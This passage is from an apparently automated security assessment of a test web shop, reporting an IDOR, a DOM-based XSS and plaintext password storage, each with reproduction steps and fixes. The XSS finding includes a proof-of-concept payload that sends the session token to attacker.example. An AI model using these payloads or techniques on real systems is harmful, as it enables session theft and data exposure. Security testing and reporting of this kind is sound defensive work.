The most direct fix is to add an ownership check immediately after the order lookup: compare `order.ownerId` against the authenticated user's session ID and return a 403 (or 404, to avoid revealing that the order exists) on mismatch. As a secondary hardening measure, consider replacing sequential order IDs with UUIDs to make enumeration impractical, though this is defense-in-depth and not a substitute for the authorization check.

**Inline Evidence**

*Response to `GET /api/orders/ord-2001` while authenticated as `exampleuser` (u-100) — returns `rivercustomer`'s full order including shipping address and payment approval code.* — from `artifacts/validation/f36b06ef-84d0-45cf-ba1a-7b49812c08a6/idor-order-response.json`:

```json
{
  "id": "ord-2001",
  "ownerId": "u-200",
  "total": "$4,800.00",
  "status": "Processing",
  "items": [
    "Corporate gift cards"
  ],
  "shippingAddress": "42 River Road, Shelbyville",
  "paymentMemo": "Corporate card 4242, approval code RIVER-SECRET"
}
```

*Browser showing the full leaked order JSON for `rivercustomer` while logged in as `exampleuser`.*

![Browser showing the full leaked order JSON for `rivercustomer` while logged in as `exampleuser`.](artifacts/validation/f36b06ef-84d0-45cf-ba1a-7b49812c08a6/idor-browser-evidence.png)

**Validation Evidence**

IDOR (Insecure Direct Object Reference) on `GET /api/orders/:id` confirmed. Any authenticated user can retrieve any order by ID regardless of ownership. The endpoint checks authentication (`requireUser`) but performs no authorization check comparing `order.ownerId` against the requesting user's ID. Authenticated as `exampleuser` (user `u-100`), successfully retrieved order `ord-2001` belonging to `rivercustomer` (`u-200`), which leaked sensitive data including shipping address (`42 River Road, Shelbyville`), payment memo (`Corporate card 4242, approval code RIVER-SECRET`), total (`$4,800.00`), and items (`Corporate gift cards`). Reproduced via both curl and browser automation with no blockers.

Reproduction steps:

1. Authenticated as `exampleuser` (user `u-100`) via `POST /api/login` with credentials `exampleuser:examplepassword`.
2. Requested own order `GET /api/orders/ord-1001` — returned correctly (order belongs to `u-100`), confirming baseline behavior.
3. Requested another user's order `GET /api/orders/ord-2001` (belongs to `u-200` / `rivercustomer`) — returned full order data including sensitive fields (shippingAddress, paymentMemo, total, items), confirming IDOR.
4. Browser validation: Logged in via the UI as `exampleuser`, navigated to `http://localhost:3000/api/orders/ord-2001`, and the JSON response displayed in the browser with all sensitive data.

Payloads tried: `GET /api/orders/ord-2001 (authenticated as exampleuser / u-100, order belongs to rivercustomer / u-200)`.

Evidence artifacts:

- [http-response] IDOR order response — `artifacts/validation/f36b06ef-84d0-45cf-ba1a-7b49812c08a6/idor-order-response.json`: HTTP response from GET /api/orders/ord-2001 while authenticated as exampleuser (u-100). Returned full order data belonging to rivercustomer (u-200) including shippingAddress, paymentMemo, total, and items.
- [http-response] Own order response (baseline) — `artifacts/validation/f36b06ef-84d0-45cf-ba1a-7b49812c08a6/own-order-response.json`: Baseline HTTP response from GET /api/orders/ord-1001 showing exampleuser's own order for comparison.
- [screenshot] Browser screenshot showing leaked data — `artifacts/validation/f36b06ef-84d0-45cf-ba1a-7b49812c08a6/idor-browser-evidence.png`: Browser screenshot captured while authenticated as exampleuser showing the full JSON response of ord-2001 (rivercustomer's order) rendered in the browser, confirming IDOR via UI.
- [file] Reproducible PoC shell script — `artifacts/validation/f36b06ef-84d0-45cf-ba1a-7b49812c08a6/poc.sh`: Shell script that reproduces the IDOR vulnerability by authenticating as exampleuser and requesting another user's order.
- [file] Full validation report — `artifacts/validation/f36b06ef-84d0-45cf-ba1a-7b49812c08a6/validation-summary.md`: Complete validation summary report documenting the IDOR vulnerability, reproduction steps, evidence, and root cause analysis.
- [note] Source code root cause: Root cause in src/server.js lines 57-63: The GET /api/orders/:id handler calls requireUser(req) for authentication but never checks if order.ownerId matches the requesting user's ID before returning the full order object.
- [agent-transcript] Web validation transcript: finding-5 — `artifacts/transcripts/web-validation-f36b06ef-84d0-45cf-ba1a-7b49812c08a6.jsonl`: Captured 70 Claude Agent SDK messages.

---

### 6. DOM-Based XSS via innerHTML with Unsanitized Server Data

| | |
| --- | --- |
| **Severity:** high | **Confidence:** high |
| **Category:** xss | **Finding ID:** `finding-6` |
| **Target:** `public/app.js:59`, `public/app.js:100`, `public/app.js:103` (+2 more) | **Validation:** confirmed (high) |

**Description**

An attacker who can influence any server-returned data field — product badge, user display name, or error message — can execute arbitrary JavaScript in the browser of every visitor to the site, steal their session token, and act on their behalf. The application's front-end (`public/app.js`) renders these fields into the DOM using `innerHTML` with template-literal interpolation and no HTML escaping whatsoever. The most dangerous sink is `loadProducts` (line 59), which fires on every page load for all visitors including unauthenticated guests. The impact is compounded by the fact that the session JWT is stored in `localStorage` (lines 1 and 33), making it trivially exfiltrable by any injected script via `localStorage.getItem("shopnorth_token")`.

**Affected Locations**

- `public/app.js:59` — loadProducts (Lines 59–67: renders product.badge, product.name, product.price directly into DOM using innerHTML with template literal interpolation and zero HTML escaping. Fires on every page load for all visitors including unauthenticated guests.)
- `public/app.js:100` — loadAdminDirectory (Line 100: renders data.error via innerHTML without escaping.)
- `public/app.js:103` — loadAdminDirectory (Lines 103–105: renders user.displayName, user.email, user.role via innerHTML without escaping.)
- `public/app.js:74` — renderOrders (Lines 74–79: same unsafe innerHTML pattern (currently hardcoded data but same vulnerable pattern).)
- `public/app.js:1` (Session token stored in localStorage (line 1 and line 33), making it trivially exfiltrable by any XSS payload via localStorage.getItem('shopnorth_token').)

**Exploit Scenario**

An attacker first leverages the path-traversal file-write vulnerability (Finding 3) to overwrite `src/db/users.js` and plant an XSS payload — for example, setting a product's `badge` field to `<img src=x onerror="new Image().src='https://attacker.example/steal?token='+localStorage.getItem('shopnorth_token')">`. After the next server restart, every visitor who loads the homepage triggers `loadProducts`, which feeds the poisoned badge value straight into `innerHTML`. The injected `<img>` tag fails to load, the `onerror` handler fires, and the visitor's JWT is silently sent to the attacker's server. With that token the attacker can impersonate any user, including administrators. The same pattern applies to the admin directory view, where a poisoned `displayName` or `email` field would fire XSS in the browser of any staff member who opens the Staff page.

**Recommendations**

Replace every use of `innerHTML` with `textContent` for fields that should only contain plain text — this single change neutralises the injection across all three sinks (`loadProducts`, `renderOrders`, `loadAdminDirectory`). For any field that legitimately needs to contain markup, pass the value through an HTML-entity-escaping function (replacing `<`, `>`, `&`, `"`, and `'`) or use a library such as DOMPurify before interpolation. As a secondary hardening measure, move the session token out of `localStorage` and into an `HttpOnly` cookie so that even a successful XSS execution cannot directly exfiltrate it.

**Inline Evidence**

*Proof-of-concept: overriding fetch to inject a token-stealing `<img onerror>` payload into the product badge field rendered by `innerHTML`.* — from `artifacts/validation/617285d1-faa1-4ae2-aa90-632c252a2ff6/poc-xss-innerhtml.js`:

```js
// 1. Override fetch to return a malicious badge
const origFetch = window.fetch;
window.fetch = async function(url, opts) {
  if (typeof url === "string" && url.includes("/api/products")) {
    return {
      ok: true,
      json: async () => [
        {
          id: "p-101",
          name: "Trail Runner Backpack",
          price: "$89.00",
          badge: '<img src=x onerror="new Image().src=\'https://attacker.example/steal?token=\'+localStorage.getItem(\'shopnorth_token\')">' 
        }
      ]
    };
  }
  return origFetch.call(this, url, opts);
};

// 2. Trigger the vulnerable code path
loadProducts();

// Result: The onerror handler fires, exfiltrating the auth token from localStorage.
```

*Product listing after payload injection — the broken image icon in the first card is the injected `<img src=x>` tag, confirming `innerHTML` parsed attacker-controlled HTML.*

![Product listing after payload injection — the broken image icon in the first card is the injected `<img src=x>` tag, confirming `innerHTML` parsed attacker-controlled HTML.](artifacts/validation/617285d1-faa1-4ae2-aa90-632c252a2ff6/xss-fired.png)

**Validation Evidence**

DOM-based XSS via innerHTML with unsanitized server data confirmed in multiple rendering functions in public/app.js. Three innerHTML sinks were validated: product badge field in #product-list (line 59), error message in #admin-list (line 100), and user displayName in #admin-list (line 103). All render server-provided data through template literals into innerHTML without any sanitization, escaping, or use of textContent/DOMPurify. XSS execution was proven by injecting an img/onerror payload into the badge field via a fetch override, which changed document.title to "XSS_FIRED". The admin-list sink was similarly confirmed with a payload setting window.__admin_xss=true. Amplification is significant: authentication tokens stored in localStorage (lines 1, 33 of app.js) are accessible to any injected script, enabling session hijacking — confirmed by retrieving a JWT via localStorage.getItem("shopnorth_token").

Reproduction steps:

1. Navigate to http://localhost:3000
2. In browser devtools console, override fetch to return a malicious product badge: const origFetch = window.fetch; window.fetch = async (url, opts) => { if (url.includes('/api/products')) { return { ok: true, json: async () => [{ id: 'p-101', name: 'Test', price: '$1', badge: '<img src=x onerror=document.title="XSS_FIRED">' }] }; } return origFetch(url, opts); }; loadProducts();
3. Observe that document.title changes to 'XSS_FIRED', confirming arbitrary JavaScript execution through the innerHTML sink.
4. Repeat with admin-list sink by injecting <img src=x onerror=window.__admin_xss=true> into displayName field rendered via innerHTML in #admin-list — window.__admin_xss becomes true.
5. Confirm token theft amplification by running localStorage.getItem('shopnorth_token') from any injected script context — a JWT is returned.

Payloads tried: `<img src=x onerror=document.title="XSS_FIRED"> — injected into #product-list innerHTML via badge field — executed successfully`, `<img src=x onerror=window.__admin_xss=true> — injected into #admin-list innerHTML via displayName field — executed successfully`, `localStorage.getItem("shopnorth_token") — token access amplification check — JWT retrieved successfully`.

Evidence artifacts:

- [screenshot] XSS_FIRED in document title — `artifacts/validation/617285d1-faa1-4ae2-aa90-632c252a2ff6/xss-fired.png`: Screenshot showing document.title changed to 'XSS_FIRED' after injecting <img src=x onerror=document.title="XSS_FIRED"> into the product badge field, confirming arbitrary JS execution via innerHTML sink in #product-list.
- [file] PoC XSS innerHTML exploitation script — `artifacts/validation/617285d1-faa1-4ae2-aa90-632c252a2ff6/poc-xss-innerhtml.js`: Full proof-of-concept script demonstrating XSS via innerHTML with token-theft payload leveraging localStorage token storage.
- [note] Detailed test results and evidence notes — `artifacts/validation/617285d1-faa1-4ae2-aa90-632c252a2ff6/evidence-notes.md`: Detailed notes covering all three confirmed innerHTML sinks (product badge at line 59, error at line 100, displayName at line 103), DOM evidence showing live HTML parsing of injected payloads, and confirmation that localStorage JWT tokens are accessible to injected scripts.
- [agent-transcript] Web validation transcript: finding-6 — `artifacts/transcripts/web-validation-617285d1-faa1-4ae2-aa90-632c252a2ff6.jsonl`: Captured 68 Claude Agent SDK messages.

---

### 7. Plaintext Credential Storage

| | |
| --- | --- |
| **Severity:** high | **Confidence:** high |
| **Category:** cryptography | **Finding ID:** `finding-7` |
| **Target:** `src/db/users.js:1`, `src/server.js:19`, `src/routes/login.js:9` | **Validation:** confirmed (high) |

**Description**

Every user password in the application is stored as a plaintext string, and authentication compares passwords with a simple string-equality check — no hashing, salting, or key-derivation function is involved. API keys and payment-card fragments are likewise kept in cleartext within each user record. Because nothing is hashed or encrypted at rest, any path to the data layer — repository access, the unauthenticated admin endpoint (Finding 2), or the profile IDOR (Finding 4) — immediately yields every credential in directly usable form.

**Affected Locations**

- `src/db/users.js:1` — users (Lines 1–38: the users array stores all passwords as plaintext strings. API keys and payment card fragments are also stored in cleartext.)
- `src/server.js:19` (Login comparison is a direct string equality check (user.password !== body.password) — no hashing.)
- `src/routes/login.js:9` (Same plaintext comparison pattern in the Express route.)

**Exploit Scenario**

An attacker who has gained access to the admin endpoint (see Finding 2) issues an authenticated `GET /api/admin/users` request. The server returns the complete user array, including plaintext passwords such as `examplepassword`, `riverpassword`, and `adminpassword`, along with cleartext API keys like `admin-root-api-key-cafe`. The attacker can now log in as any user — including the store administrator — without any password-cracking effort. Even without the admin endpoint, anyone who can read the source repository or exploit the profile IDOR obtains the same credentials verbatim.

**Recommendations**

Replace plaintext password storage with a one-way adaptive hash such as bcrypt or argon2, and use the library's constant-time verification function for login comparisons instead of a direct `!==` check. API keys and payment-card data should be removed from user records entirely or encrypted at rest with a properly managed key. As a secondary hardening measure, ensure that API responses — especially the admin endpoint — strip sensitive fields before serialization so that passwords and keys are never returned to any client.

**Inline Evidence**

*Response from GET /api/admin/users — all passwords, API keys, and payment data returned in cleartext.* — from `artifacts/validation/20666ac0-2bb2-49da-9049-51b4d7ccfee3/admin-users-response.json`:

```json
[
  {
    "id": "u-100",
    "username": "exampleuser",
    "password": "examplepassword",
    "role": "customer",
    "apiKey": "shopper-api-key-7f2d",
    "notes": "Prefers delivery after 5pm."
  },
  {
    "id": "u-200",
    "username": "rivercustomer",
    "password": "riverpassword",
    "role": "customer",
    "apiKey": "river-private-api-key-91ab",
    "notes": "Saved payment: Visa ending 4242"
  },
  {
    "id": "u-900",
    "username": "storeadmin",
    "password": "adminpassword",
    "role": "admin",
    "apiKey": "admin-root-api-key-cafe",
    "notes": "Administrative account."
  }
]
```

**Validation Evidence**

All passwords are stored as plaintext strings in src/db/users.js (e.g., "examplepassword", "riverpassword", "adminpassword") with no hashing. Authentication in src/server.js (line 19) uses direct string equality comparison (`!==`) with no hash function. API keys are also stored in cleartext in user objects. Payment/sensitive data appears in cleartext in user notes and order paymentMemo fields. The admin endpoint GET /api/admin/users returns full user objects including plaintext passwords and API keys without any field filtering. Live login with a plaintext password succeeded, and the admin endpoint confirmed exposure of all secrets.

Reproduction steps:

1. Source inspection: Read src/db/users.js — confirmed all passwords are plaintext strings (lines 5, 18, 29).
2. Source inspection: Read src/server.js line 19 — confirmed direct string comparison (user.password !== body.password) with no hash call.
3. Live login: curl -X POST http://localhost:3000/api/login -d '{"username":"exampleuser","password":"examplepassword"}' — returned valid session token.
4. Live admin query: Authenticated as storeadmin, called GET /api/admin/users — response contained all passwords and API keys in cleartext.

Payloads tried: `{"username":"exampleuser","password":"examplepassword"}`, `GET /api/admin/users (authenticated as storeadmin)`.

Evidence artifacts:

- [http-response] Successful login response using plaintext password — `artifacts/validation/20666ac0-2bb2-49da-9049-51b4d7ccfee3/login-response.json`: Successful login response confirming that supplying the plaintext password 'examplepassword' for user 'exampleuser' returns a valid session token.
- [http-response] Admin endpoint response exposing all plaintext passwords & API keys — `artifacts/validation/20666ac0-2bb2-49da-9049-51b4d7ccfee3/admin-users-response.json`: Response from GET /api/admin/users containing full user objects with plaintext passwords (e.g., 'examplepassword', 'riverpassword', 'adminpassword') and cleartext API keys (e.g., 'shopper-api-key-7f2d', 'admin-root-api-key-cafe').
- [note] Detailed validation notes — `artifacts/validation/20666ac0-2bb2-49da-9049-51b4d7ccfee3/validation-notes.md`: Detailed notes covering plaintext password storage in src/db/users.js, direct string comparison in src/server.js, cleartext API keys, payment data in cleartext in notes/paymentMemo fields, and the admin endpoint exposing all secrets without field filtering.
- [agent-transcript] Web validation transcript: finding-7 — `artifacts/transcripts/web-validation-20666ac0-2bb2-49da-9049-51b4d7ccfee3.jsonl`: Captured 37 Claude Agent SDK messages.

## Artifacts

The run produced 33 artifacts stored under the run directory (9 file, 8 http-response, 7 note, 7 agent-transcript, 2 screenshot). Evidence artifacts cited in individual findings are listed inline with each finding above; the remaining artifacts are agent transcripts and intermediate analysis inputs available on disk.
